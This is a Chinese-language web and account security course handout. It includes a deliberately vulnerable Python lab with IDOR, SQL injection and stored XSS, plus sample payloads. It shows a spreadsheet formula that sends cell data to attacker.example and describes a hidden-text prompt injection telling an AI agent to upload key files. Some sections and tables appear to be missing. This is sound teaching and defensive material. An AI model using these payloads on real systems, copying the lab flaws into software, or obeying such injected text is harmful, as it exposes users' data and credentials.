如何使用這份講義

學完你能做到什麼

  • 用攻擊者的角度，列出專案最值得保護的東西和可能的入侵路徑。

  • 保護好 Google、GitHub 和交易平台帳號，並在密鑰外洩時正確處理。

  • 說明權限控管失效、注入、XSS、CSRF 的原理，並在練習環境重現與修補。

  • 替你的專案完成一輪威脅建模、修補和驗證。

  • 被入侵時知道先做什麼、後做什麼。

每課都走同一個循環

  1. 理解： 先搞懂這個攻擊為什麼會成功。

  2. 攻擊： 在練習環境親手重現一次。

  3. 修補： 從根本原因修，不只擋住那一組輸入。

  4. 驗證： 用同樣手法再攻擊一次，確認真的擋住。

只讀不做很難學會資安。每課的實作比閱讀重要，時間不夠時，寧可少讀一段，也不要跳過實作。

法律與道德紅線

只能攻擊三種目標：你自己的系統、專門提供的練習環境，以及取得明確書面授權的目標。 其他目標一律不碰。

  • 「只是看看，沒有破壞」不是免責理由。在台灣，未經授權入侵電腦可能觸犯刑法妨害電腦使用罪（第 358 至 363 條）。

  • 你自己的帳號跑在別人的平台上，不代表整個平台都能測。Google、GitHub、交易平台的伺服器都不是你的測試目標。

  • 想測第三方服務時，先讀對方的漏洞通報政策（VDP）或漏洞獎金計畫（Bug Bounty）規則，並嚴守範圍。

  • 意外發現別人的漏洞時，不要繼續深入、不要下載資料，應透過官方管道通報。

第 1 課 核心觀念與攻擊者思維

攻擊者不會從「怎麼破解」開始想，而是從「什麼值錢、哪裡最好進」開始。防守方也應該用同樣順序思考。

1.1 資安在保護什麼：CIA 三要素

幾乎所有資安事件，都是破壞了以下三者之一。

要素意思被破壞的例子（以交易日誌為例）
機密性（Confidentiality）只有該看的人看得到交易紀錄和帳號資訊被外人讀到
完整性（Integrity）資料沒有被竄改別人改掉損益數字，你的檢討全部失準
可用性（Availability）需要時用得到工作表被清空，且沒有備份

另外要分清兩個常被混用的詞：

  • 驗證（Authentication）： 你是誰？例如登入。

  • 授權（Authorization）： 你可以做什麼？例如能不能讀這筆資料。

很多嚴重漏洞都是「有驗證、沒授權」，也就是確認了你已登入，卻沒檢查這筆資料是不是你的。

1.2 五個基本名詞

名詞意思生活比喻
資產（Asset）值得保護的東西家裡的現金
威脅（Threat）可能造成傷害的人或事件小偷
漏洞（Vulnerability）可以被利用的弱點沒鎖的窗戶
攻擊手法（Exploit）利用弱點的實際做法從窗戶爬進去
風險（Risk）發生機率 × 造成損失住一樓又沒裝鐵窗有多危險

資源永遠有限，所以目標不是消滅所有漏洞，而是先處理風險最高的部分。

1.3 誰會攻擊你

個人專案很少被專門鎖定，但自動化攻擊不挑對象。

攻擊者目的常用方式對你的相關性
自動化掃描與機器人大量找容易下手的目標掃公開 repo 的密鑰、試已外洩的密碼高
大規模詐騙集團盜帳號、騙錢釣魚信、假登入頁、竊密木馬高，尤其你有交易帳號

認識你的人好奇或惡意用你借出的電腦或分享過的連結中
國家級駭客政治、情報客製化攻擊低，不必納入個人專案防護目標

1.4 攻擊面：所有可能進來的門

攻擊面是攻擊者能接觸到的所有入口。很多人只想到程式，其實入口通常比程式多。

  • 人： 你會點連結、會輸入密碼、也會趕時間。

  • 帳號： Google、GitHub、交易平台、Email。

  • 裝置： 你的電腦、手機、瀏覽器擴充功能。

  • 程式： 網址、表單、上傳功能、API。

  • 相依項目： 套件、CI、第三方服務、AI 工具。

  • 資料： 備份、匯出的 CSV、截圖、公開分享連結。

減少攻擊面通常比加強防守便宜。用不到的功能、權限、帳號和分享連結，直接關掉就少一道門。

1.5 一次攻擊通常怎麼發生

實際入侵常是一串小步驟，所以在任何一步擋下都有價值。

  1. 偵察： 找公開資訊，例如 GitHub、社群貼文、外洩密碼庫。

  2. 取得入口： 釣魚、撞庫、外洩金鑰或網站漏洞。

  3. 站穩腳步： 留下能再次進入的方式，例如新增 OAuth 授權、轉寄規則。

  4. 擴大權限： 從 Email 重設其他服務的密碼，或用找到的金鑰碰更多系統。

  5. 達成目的： 偷資料、勒索、盜用帳號或轉走資產。

  6. 掩蓋痕跡： 刪除通知信、清除紀錄。

第 3 步特別容易被忽略：只改密碼，可能無法清除攻擊者留下的授權和轉寄規則。第 6 課會教你如何檢查。

1.6 防守的六個原則

  1. 最小權限： 只給完成工作所需的最小權限。

  2. 縱深防禦： 不依賴單一防線，一層失守還有下一層。

  3. 預設拒絕： 沒有明確允許的就拒絕，出錯時也要往安全的一邊失敗。

  4. 不信任輸入： 瀏覽器送來的一切都可能被改過，包含隱藏欄位和 Cookie。

  5. 保持簡單： 系統越複雜越難檢查，也越容易出錯。

  6. 假設會被攻破： 先備好備份、紀錄和應變流程。

另外要避免隱匿式安全：把網址取得很長、不告訴別人，不等於有權限控管。網址可能出現在瀏覽紀錄、截圖或分享訊息裡。

1.7 威脅建模：四個問題

威脅建模就是在動手前有系統地想一遍。個人專案只要回答四個問題：

  1. 我在做什麼？畫出資料從哪裡來、到哪裡去。

  2. 哪裡可能出錯？

  3. 我要怎麼處理？

  4. 我做得夠好嗎？實際測試一次。

回答第 2 題時，可以用 STRIDE 當提示：

類型問自己主要破壞
Spoofing 冒充別人能假裝成我嗎？驗證
Tampering 竄改資料能在我不知情時被改嗎？完整性
Repudiation 否認出事後查得出是誰做的嗎？可追溯性
Information Disclosure 洩漏資料會被不該看的人看到嗎？機密性
Denial of Service 阻斷服務或額度會被耗盡嗎？可用性
Elevation of Privilege 提權低權限者能做高權限的事嗎？授權

第 2 課 帳號與密鑰

攻擊者能用偷來的憑證登入時，就不需要破解程式。所以這一課是全部課程中最划算的投資。

2.1 帳號是怎麼被盜的

手法怎麼運作主要防禦
釣魚（Phishing）用假信或假登入頁騙你輸入密碼與驗證碼通行金鑰、硬體金鑰、不從信件連結登入
撞庫（Credential Stuffing）拿別站外洩的帳密，大量嘗試其他網站每個網站用不同密碼
密碼噴灑（Password Spraying）用少數常見密碼嘗試大量帳號長且隨機的密碼
竊密木馬（Infostealer）惡意程式偷走瀏覽器密碼和登入 Cookie不裝來路不明的軟體、保持系統更新
工作階段竊取（Session Hijacking）偷到登入 Cookie 後，不用密碼也能登入保護裝置、登出不用的工作階段
OAuth 授權釣魚騙你按「允許」，把帳號權限交給惡意應用程式看清權限內容、定期移除舊授權
多因素疲勞轟炸（MFA Fatigue）不斷發送登入確認，等你誤按允許不是你發起的請求一律拒絕，並立刻改密碼
SIM 卡挾持（SIM Swap）騙電信商換卡，以接收你的簡訊驗證碼重要帳號不用簡訊當驗證方式

2.2 釣魚怎麼辨認

釣魚的核心不是技術，而是製造急迫感，讓你來不及思考。常見話術包括帳戶即將停用、偵測到異常登入、出金失敗和獎勵即將過期。

  • 先看網域： 由右往左讀主網域。your-broker.com.login-check.example 的真正網域是 login-check.example，不是你的交易平台。

  • 不要靠外觀判斷： 假網站可以完全複製畫面，也可以有 HTTPS 鎖頭。鎖頭只代表連線加密，不代表對方可信。

  • 不要從信件連結登入： 用自己的書籤或手動輸入網址前往。

  • 注意下載： 交易者常被假的指標、外掛或報表工具引誘，這些都可能是竊密木馬。

  • 懷疑就停下： 真正的急事，到官方網站登入後也看得到。

進階釣魚會在你和真網站之間即時轉送資料，連一次性驗證碼都能騙走。通行金鑰和硬體金鑰會綁定真實網域，在假網站上無法使用，因此能防住這種攻擊。

2.3 多因素驗證的強度排序

排名方式防釣魚能力建議
1硬體安全金鑰（FIDO2）強最重要的帳號可考慮，並準備兩把
2通行金鑰（Passkey）強平台支援就優先使用
3驗證器 App（TOTP）中，驗證碼仍可能被騙走不支援通行金鑰時使用
4手機推播確認中，可能被疲勞轟炸只確認自己發起的登入
5簡訊驗證碼弱總比沒有好，但應盡量換掉

備援碼也要離線保存。沒有備援方式的多因素驗證，可能讓你把自己鎖在帳號外面。

2.4 密碼規則

  • 用密碼管理器： 這是做到「每站不同密碼」最實際的方法。它也只會在正確網域自動填入，能幫你多擋一次釣魚。

  • 長度比複雜度重要： 重要帳號使用管理器產生的長隨機密碼。

  • 主密碼要特別處理： 使用一組只有你知道的長密語，不要用在其他地方，並開啟管理器的多因素驗證。

  • 不要定期亂改： 除非有外洩跡象，否則不必為了改而改，但一定不可重複使用。

  • 檢查是否外洩： 可到 Have I Been Pwned 查 Email 是否出現在外洩事件中。

2.5 先保護 Email

Email 通常是所有帳號的總鑰匙，因為多數服務都能透過 Email 重設密碼。對你來說，Google 帳號應排在第一位。

服務要檢查的項目
Google安全性檢查、兩步驟驗證、復原電子郵件與電話、第三方連結、Gmail 的轉寄和篩選器
GitHub多因素驗證或通行金鑰、SSH 金鑰、Personal Access Token、已授權的 OAuth 應用程式
交易與券商平台專用密碼、平台提供的多因素驗證、登入通知、出金資訊
密碼管理器主密碼、多因素驗證、復原方式

2.6 密鑰是什麼，為什麼危險

API 金鑰、Token 和服務帳號憑證，都等於一組不需要互動的帳號密碼。它們常常沒有多因素驗證保護，一旦外洩就能直接使用。

類型常見例子外洩後果
API 金鑰AI 服務金鑰、資料服務金鑰被盜用、產生費用
存取權杖GitHub Token、OAuth Token以你的身分操作服務
登入憑證檔.clasprc.json、服務帳號 JSON程式化存取你的雲端資源
私鑰SSH 私鑰存取伺服器或 repo
連線字串資料庫 URL資料庫被讀取或清空

公開 repo 中的密鑰可能很快被自動掃描器發現，所以不能假設「只公開了幾分鐘」就沒事。

2.7 密鑰的正確管理

  1. 不寫進程式碼： 使用環境變數或平台提供的密鑰儲存。GAS 可用 Script Properties，但專案編輯者仍可能接觸得到。

  2. 先寫 .gitignore： 建立 repo 時就先排除敏感檔案。

  3. 權限最小化： 只給必要的 repo、讀寫範圍和有效期限。

  4. 開啟防護： 使用 GitHub 的 Secret Scanning 和 Push Protection，並在提交前掃描。

  5. 定期檢查： 移除不再使用的金鑰與 Token。

.gitignore 範例：

.env
.env.*
!.env.example
.clasprc.json
*.pem
*.key
# 專案不需要提交的私人交易資料
*.csv
screenshots/

注意：.gitignore 只對尚未追蹤的檔案有效。已提交過的檔案要另外處理。

2.8 密鑰外洩時的正確順序

  1. 先撤銷或更換： 這是第一步。只刪除程式碼，金鑰依然有效。

  2. 查使用紀錄： 看外洩期間有沒有異常呼叫、費用或操作。

  3. 再清除歷史： 必要時才重寫 Git 歷史。但已外洩的內容可能被複製，所以這一步不能取代撤銷。

  4. 找出原因： 補上 .gitignore、掃描工具或流程缺口。

第 3 課 網頁運作與攻擊基礎

大多數網頁漏洞都來自同一個錯誤：伺服器相信了使用者可以控制的東西。這一課要讓你親眼看到，瀏覽器送出的內容全部都能修改。

3.1 一次網頁請求長什麼樣子

瀏覽器和伺服器透過 HTTP 溝通。你點一個按鈕，實際上是送出類似這樣的文字：

POST /api/trades/update HTTP/1.1
Host: app.example
Cookie: session=abc123
Content-Type: application/json

{"tradeId": 5, "note": "等收K"}

伺服器則回傳類似這樣的回應：

HTTP/1.1 200 OK
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
Content-Type: application/json

{"ok": true}
部分用途攻擊者能否修改
方法與路徑要做什麼、對哪個資源可以
查詢參數，例如 ?id=5傳遞參數可以
標頭，例如 Referer、User-Agent附加資訊可以
Cookie通常用來保存登入狀態自己的可以
內容（Body）表單或 JSON 資料可以

關鍵觀念： 網頁上的按鈕、下拉選單、隱藏欄位和 JavaScript 檢查，都只是給正常使用者的介面。攻擊者可以略過介面，直接送出任何請求。

3.2 信任邊界：這課最重要的概念

信任邊界是資料從「你控制不了」進入「你控制得了」的那條線。每次跨越，都要檢查。

  • 前端驗證： 只為了使用體驗，不算安全防線。

  • 後端驗證： 才是真正的防線，因為攻擊者碰不到伺服器上的程式碼。

  • 看似內部的資料也可能不可信： 上傳的 CSV、資料庫中他人輸入過的文字、第三方 API 回應，都應視為輸入。

驗證時要盡量使用允許清單：明確定義什麼是合法的，其他全部拒絕。封鎖清單很容易漏掉變形寫法。

欄位不好的做法較好的做法
方向擋掉 <script>只接受 Long 或 Short
口數只檢查有值必須是 1 到合理上限之間的整數
日期直接存字串解析成日期並檢查範圍
筆記刪除危險字元限制長度，並在輸出時依情境編碼

3.3 登入狀態與 Cookie

HTTP 本身不記得你是誰。登入後，伺服器通常會發一個工作階段識別碼，瀏覽器之後每次請求都會自動帶上它。誰拿到這個識別碼，通常就能冒充你。

Cookie 屬性作用主要防的是什麼
HttpOnlyJavaScript 讀不到降低 XSS 偷走 Cookie 的風險
Secure只透過 HTTPS 傳送防止明文傳輸被竊聽
SameSite限制跨網站請求是否帶上 Cookie降低 CSRF 風險
過期時間控制有效期限縮短被盜後可使用的時間

3.4 同源政策與 CORS

同源指通訊協定、網域、連接埠三者都相同。

網址與 https://app.example 同源嗎原因
https://app.example/report是只有路徑不同
http://app.example否通訊協定不同
https://api.app.example否網域不同
https://app.example:8443否連接埠不同

同源政策限制的是一個網站的 JavaScript 讀取另一個網站的回應。它有兩個常見誤解：

  • 它不阻止所有跨站請求。 惡意網站通常仍能讓瀏覽器送出請求，這就是 CSRF 存在的原因。

  • CORS 不是防護機制。 CORS 是放寬同源限制的方法。設定成允許任何來源，等於主動開門。

CORS 也不能取代伺服器端的權限檢查，因為 curl 這類非瀏覽器工具根本不受它限制。

第 4 課 網頁漏洞攻防

這些漏洞名稱很多，但大多可以歸納成兩種錯誤：沒有檢查權限，或把資料當成程式碼執行。學會辨認這兩種模式，比背名詞更有用。

4.1 OWASP Top 10：業界常用的風險清單

OWASP Top 10:2025 是最常被引用的網頁應用風險清單。它不是完整的檢查標準，但很適合當入門地圖。

排名類別白話解釋本講義位置

4.2 權限控管失效（Broken Access Control）

這是 OWASP 2025 排名第一的類別。它的核心很簡單：系統確認了你是誰，卻沒確認你能不能碰這筆資料。

常見形式：不安全的物件參照（IDOR）

GET /note?id=1   ← 我的筆記
GET /note?id=2   ← 改個數字，看到別人的筆記
面向內容
為什麼會發生程式只用 id 查資料，沒有比對資料擁有者
可能後果讀取、修改或刪除他人資料，甚至取得管理權限
正確防禦每個請求都在伺服器端檢查權限，查詢時帶上目前使用者
無效的做法隱藏按鈕、把 id 改成亂數。亂數能增加猜測難度，但不能取代權限檢查
# 有漏洞
row = db.execute("SELECT * FROM notes WHERE id = ?", (note_id,)).fetchone()

# 修補：用目前登入者限制查詢範圍
row = db.execute(
    "SELECT * FROM notes WHERE id = ? AND owner = ?", (note_id, current_user)
).fetchone()

其中 current_user 必須來自伺服器驗證過的工作階段，不能來自請求參數。

檢查方式： 準備兩個測試帳號 A 和 B。用 A 建立資料，再用 B 嘗試讀取、修改和刪除。每個 API 都要測。

4.3 SQL 注入（SQL Injection）

把使用者輸入直接拼進 SQL，輸入內容就可能變成查詢指令的一部分。

# 有漏洞
sql = f"SELECT id, title FROM notes WHERE title LIKE '%{q}%'"

當使用者輸入 x%' OR 1=1 --，查詢會變成：

SELECT id, title FROM notes WHERE title LIKE '%x%' OR 1=1 --%'

' 結束了原本的字串，OR 1=1 讓條件永遠成立，-- 則把後面的內容變成註解。

面向內容
可能後果讀取整個資料庫、竄改或刪除資料、繞過登入
正確防禦參數化查詢，讓資料庫明確區分指令和資料
補強措施資料庫帳號使用最小權限、限制輸入格式
無效的做法只過濾單引號或 OR。攻擊者常能找到其他寫法
# 修補：參數化查詢
sql = "SELECT id, title FROM notes WHERE title LIKE ?"
rows = db.execute(sql, (f"%{q}%",)).fetchall()

NoSQL、LDAP 和範本引擎也有類似的注入問題。原則相同：不要把資料拼接成指令。

4.4 跨站腳本（XSS）

XSS 是資料被瀏覽器當成 JavaScript 執行。惡意腳本會在受害者的登入狀態下運作，能以他的身分發請求，或讀取頁面上的資料。

類型惡意內容在哪裡例子
儲存型存在伺服器，所有檢視者都可能中招留言、交易筆記
反射型放在網址等請求內容，由回應帶回騙你點一個特製連結
DOM 型前端 JavaScript 自己把資料寫進頁面innerHTML = location.hash

最小的驗證內容如下，只會跳出無害的提示框：

<img src=x onerror=alert(document.domain)>

防禦的重點是輸出時依情境編碼：

資料放在哪裡正確做法
HTML 內容用 textContent，或做 HTML 編碼
HTML 屬性使用框架綁定，或做屬性編碼並加上引號
JavaScript避免直接插入，改用 JSON 或 data 屬性傳遞
網址驗證通訊協定只允許 https:，避免 javascript:
必須顯示 HTML使用 DOMPurify 這類成熟函式庫，不要自己寫過濾
// 有漏洞
cell.innerHTML = note;

// 修補：文字就當文字處理
cell.textContent = note;

補強措施：

  • 內容安全政策（CSP）： 限制頁面可載入和執行的腳本，是重要的第二道防線。

  • HttpOnly Cookie： 讓腳本讀不到登入 Cookie，但腳本仍能以受害者身分操作，所以不能取代輸出編碼。

4.5 跨站請求偽造（CSRF）

CSRF 是騙你的瀏覽器，帶著你的登入狀態，對另一個網站送出你沒打算送的請求。它的成因是瀏覽器會依規則自動帶上 Cookie。

防偽權杖會讓第 4 步的請求被拒絕，SameSite 則可以讓瀏覽器在許多跨站情況下不帶上 Cookie。

面向內容
能做到觸發改資料的操作，例如改設定或刪除資料
通常做不到讀取跨站回應，因為同源政策會限制
主要防禦防偽權杖（Anti-CSRF Token）、SameSite Cookie、檢查 Origin 或 Fetch Metadata 標頭
基本規則不要用 GET 改變狀態

4.6 伺服器端請求偽造（SSRF）

你的伺服器如果會依使用者提供的網址去抓資料，攻擊者就可能叫它連到內部網路或雲端中繼資料服務。這類請求來自伺服器，因此可能穿過外部防火牆。

防禦方式：

  • 只允許明確列出的目標網域，不要接受任意網址。

  • 拒絕內部 IP、本機位址和雲端中繼資料位址。

  • 解析 DNS 後再次檢查 IP，也要限制重新導向。

  • 用網路規則限制伺服器能連出的目的地。

4.7 命令注入與路徑穿越

命令注入： 把輸入拼進系統指令，輸入就可能變成另一條指令。

# 有漏洞：shell=True 加字串拼接
subprocess.run(f"convert {filename} out.png", shell=True)

# 修補：不經 shell，以清單傳遞參數，並先驗證 filename
subprocess.run(["convert", filename, "out.png"], check=True)

路徑穿越： 使用者用 ../ 跳出允許的資料夾，讀到其他檔案。

from pathlib import Path

BASE = Path("uploads").resolve()
target = (BASE / user_filename).resolve()

# 修補：解析真實路徑後，確認仍在允許的資料夾內
if not target.is_relative_to(BASE):
    raise ValueError("不合法的路徑")

4.8 檔案上傳

上傳功能同時涉及多種風險：夾帶可執行檔、用超大檔案耗盡資源，以及用惡意內容攻擊解析程式。

  • 不能只信任副檔名或瀏覽器送來的 Content-Type。

  • 限制大小、類型和數量，並實際解析內容。

  • 由伺服器產生檔名，不要沿用使用者給的路徑。

  • 上傳檔案要存放在網站無法直接執行的位置。

  • CSV 要驗證欄位，寫入試算表前要防公式注入，第 7 課會實作。

4.9 業務邏輯漏洞

程式語法完全正確，流程規則卻可能被濫用，掃描工具也很難發現。測試時可以問：

  • 數量可以是負數、零或極大值嗎？

  • 可以跳過步驟，直接呼叫最後一步嗎？

  • 同一個請求重送兩次，會寫入兩筆資料嗎？

  • 兩個請求同時送出，會發生競爭狀況（Race Condition）嗎？

4.10 登入、密碼儲存與加密

如果自己實作登入，需要處理的細節很多，能使用成熟服務或框架就不要自己寫。

主題正確做法常見錯誤
密碼儲存Argon2id、scrypt 或 bcrypt明文、MD5、SHA-256
暴力破解頻率限制、異常登入通知無限次嘗試
工作階段登入後更換識別碼、提供登出與過期機制把使用者 id 當登入憑證
重設密碼隨機、短效、一次性的權杖可預測的連結
帳號列舉成功與失敗使用一致的訊息回應「此 Email 不存在」
加密使用標準函式庫自製加密演算法
隨機值用密碼學安全亂數，例如 Python 的 secrets用 random 產生權杖

4.11 設定錯誤與例外處理

很多事件不是高深攻擊，而是設定忘了改：

  • 公開的管理頁、除錯模式或預設密碼。

  • 雲端檔案或試算表設成「知道連結的人都能存取」。

  • 錯誤頁面把堆疊追蹤、路徑或金鑰回傳給使用者。

  • 例外發生時反而放行，例如權限檢查出錯時預設允許。

正確做法是對使用者顯示簡短訊息，把詳細錯誤記在伺服器端，並且在出錯時預設拒絕。

實作：在本機攻擊並修補三個漏洞

這支程式故意包含三個漏洞，只綁定本機，請勿部署或放到網路上。把下方內容存成 lab4.py，用 python lab4.py 啟動。程式只使用 Python 標準函式庫，我已用 Python 3.14 測試過以下攻擊和修補。

# 故意有漏洞的練習程式，只綁定本機，切勿部署
import html
import sqlite3
from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

db = sqlite3.connect(":memory:", check_same_thread=False)
db.executescript("""
CREATE TABLE notes (id INTEGER PRIMARY KEY, owner TEXT, title TEXT, secret TEXT);
INSERT INTO notes VALUES
  (1, 'alice', 'Alice 的筆記', 'Alice 的秘密'),
  (2, 'bob', 'Bob 的筆記', 'Bob 的秘密');
""")
SESSIONS = {"alice-token": "alice", "bob-token": "bob"}
comments = []

class Handler(BaseHTTPRequestHandler):
    def respond(self, text, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(text.encode("utf-8"))

    def current_user(self):
        cookie = SimpleCookie(self.headers.get("Cookie", ""))
        token = cookie["session"].value if "session" in cookie else ""
        return SESSIONS.get(token)

    def do_GET(self):
        user = self.current_user()
        if not user:
            return self.respond("請先登入", 401)
        url = urlparse(self.path)
        query = parse_qs(url.query)

        if url.path == "/note":
            note_id = query.get("id", ["0"])[0]
            # 漏洞 1（權限控管失效）：沒有檢查這筆資料是不是目前使用者的
            row = db.execute(
                "SELECT title, secret FROM notes WHERE id = ?", (note_id,)
            ).fetchone()
            return self.respond(str(row))

        if url.path == "/search":
            q = query.get("q", [""])[0]
            # 漏洞 2（SQL 注入）：把使用者輸入直接拼進 SQL
            sql = f"SELECT id, title FROM notes WHERE owner = '{user}' AND title LIKE '%{q}%'"
            try:
                return self.respond(str(db.execute(sql).fetchall()))
            except sqlite3.Error:
                return self.respond("查詢失敗", 400)

        if url.path == "/comments":
            # 漏洞 3（儲存型 XSS）：把留言原樣放進 HTML
            items = "".join(f"<li>{c}</li>" for c in comments)
            form = '<form method="post"><input name="c"><button>留言</button></form>'
            return self.respond(f"{form}<ul>{items}</ul>")

        self.respond("找不到頁面", 404)

    def do_POST(self):
        if not self.current_user():
            return self.respond("請先登入", 401)
        length = int(self.headers.get("Content-Length", 0))

5.4 AI 工具帶來的新風險

AI 模型無法可靠區分「你的指令」和「它讀到的資料」，這就是提示注入的根本原因。OWASP LLM Top 10 也把它列為第一項風險。

風險例子防禦

權限過大AI 代理能刪檔、發信或推送程式碼只開必要工具，保留人工核准

危險組合是以下三者同時存在：能讀私人資料、會接觸不可信內容、能對外傳送資料。只要拿掉其中一項，風險就會大幅下降。

間接注入例子： 你請 AI 代理摘要一個網頁，網頁裡藏了一行白色文字，要求它把本機的金鑰檔上傳到某個網址。若代理有讀檔和連網權限，又沒有人工確認，這段文字就可能造成實際傷害。

5.5 如何安全地用 AI 寫程式

AI 能大幅加快開發，但生成的程式碼也可能包含漏洞。

  1. 明確提出安全需求： 例如「只有我能存取、要驗證 CSV 欄位、防公式注入」。

  2. 逐段看懂再採用： 看不懂的部分要先問清楚。

  3. 查證套件： AI 提到的套件名稱和 API 都可能不存在。

  4. 審查差異： 特別注意權限檢查、資料拼接、對外連線和金鑰處理。

  5. 實際測試： 用第 4 課的方法攻擊看看，不要只看它能不能動。

  6. 限制 AI 工具權限： 謹慎核准刪除、推送和外部請求。不要把密碼、Token 或驗證碼貼給 AI。

  7. 讓 AI 用不同角度審查： 可以請它扮演攻擊者找問題，但仍要親自確認，它也可能漏掉問題或判斷錯誤。

6.3 備份：最後一道防線

常見原則是 3-2-1：至少 3 份資料、存在 2 種不同媒介、其中 1 份放在異地。

  • 備份要能抵抗帳號被盜： 同一個 Google 帳號裡的副本，會和原檔一起被刪。至少定期在離線位置保存一份。

  • 備份要分版本： 才能在資料已被污染時，回到污染前的狀態。

  • 備份要實際還原過： 沒測試過的備份，不算可靠。

  • 備份也是敏感資料： 同樣要控管存取權限，必要時加密。

Google Sheets 的版本記錄很方便，但它和工作表在同一個帳號系統內，所以不能完全取代離線備份。

7.2 部署設定：最重要的一步

GAS 的權限由「以誰的身分執行」和「誰能存取」共同決定。Google 的設定值如下。

設定意思對你的專案的建議

access: DOMAIN同網域的人可存取不需要
access: ANYONE任何已登入的使用者可存取不要用

7.4 解析 CSV：嚴格驗證

CSV 即使是你自己下載的，也要當成不可信輸入。檔案可能選錯、格式可能改版，或內容可能已被其他程式改過。

你的 trades_export.csv 目前有這些欄位，其中檔案開頭有 BOM 字元，解析前要先移除：

Id,ContractName,EnteredAt,ExitedAt,EntryPrice,ExitPrice,Fees,PnL,Size,Type,TradeDay,TradeDuration,Commissions

另外，orders_export.csv 含有 AccountName。除非功能真的需要，否則不要寫入工作表或日誌，這就是資料最小化。

const MAX_CSV_CHARS = 2000000;
const MAX_ROWS = 10000;
const REQUIRED_COLUMNS = ['Id', 'ContractName', 'EnteredAt', 'ExitedAt',
  'EntryPrice', 'ExitPrice', 'Fees', 'PnL', 'Size', 'Type'];

function parseTradesCsv_(csvText) {
  if (typeof csvText !== 'string' || csvText.length > MAX_CSV_CHARS) {
    throw new Error('檔案格式或大小不合法');
  }
  const rows = Utilities.parseCsv(csvText.replace(/^﻿/, ''));
  if (rows.length < 2 || rows.length > MAX_ROWS) {
    throw new Error('資料列數不合法');
  }

  const header = rows[0];
  const missing = REQUIRED_COLUMNS.filter(name => !header.includes(name));
  if (missing.length > 0) {
    throw new Error('缺少欄位：' + missing.join(', '));
  }

  const col = name => header.indexOf(name);
  return rows.slice(1).map(row => ({
    id: requireInteger_(row[col('Id')], 'Id'),
    contract: safeText_(row[col('ContractName')], 20),
    entryPrice: requireNumber_(row[col('EntryPrice')], 0, 1000000, 'EntryPrice'),
    exitPrice: requireNumber_(row[col('ExitPrice')], 0, 1000000, 'ExitPrice'),
    pnl: requireNumber_(row[col('PnL')], -1000000, 1000000, 'PnL'),
    size: requireNumber_(row[col('Size')], 1, 1000, 'Size'),
    side: requireOneOf_(row[col('Type')], ['Long', 'Short'], 'Type')
  }));
}

上限數字是範例，請依你的實際資料調整。其他時間欄位請用同樣方式解析，並拒絕無效日期。

7.5 公式注入：試算表的特有風險

工作表內容不只是資料，也可能是公式。請想像一個儲存格寫入了這段文字：

=IMAGE("https://attacker.example/x.png?data="&A1)

如果它被當成公式，圖片網址就會帶上 A1 的內容，等於把資料傳給攻擊者。OWASP CSV Injection 指出，=、+、-、@、Tab 和換行都可能觸發，全形符號在部分環境也有風險。它也提醒沒有一種過濾方式適用所有試算表軟體，所以最後一定要實測。

防禦分兩種欄位：

  • 數字欄位： 解析成真正的數字再寫入，因此合法的負損益不會被誤判。

  • 文字欄位： 若以危險字元開頭，就在前面加上單引號，讓試算表當成文字。

function safeText_(value, maxLength) {
  const text = String(value == null ? '' : value).slice(0, maxLength);
  return /^[\s﻿]*[=+\-@＝＋－＠]/.test(text) ? "'" + text : text;
}

function requireNumber_(value, min, max, name) {
  const text = String(value).trim();
  if (!/^-?\d+(\.\d+)?$/.test(text)) throw new Error(name + ' 格式不合法');
  const number = Number(text);
  if (number < min || number > max) throw new Error(name + ' 超出範圍');
  return number;
}

function requireInteger_(value, name) {
  const text = String(value).trim();
  if (!/^\d{1,18}$/.test(text)) throw new Error(name + ' 格式不合法');
  return text;
}

function requireOneOf_(value, allowed, name) {
  if (!allowed.includes(value)) throw new Error(name + ' 不在允許清單內');
  return value;
}

safeText_ 和 requireNumber_ 我已用 Node.js 測試常見攻擊輸入。但它們還沒有在真正的 GAS 與 Google 工作表中執行過，所以請務必做 7.9 的攻擊測試。

requireInteger_ 會回傳字串，是為了避免很長的 Id 在轉成數字時失去精度。人工填寫的筆記欄位同樣要經過 safeText_。如果有功能會把工作表資料讀出來再寫入或匯出，也要再次檢查。
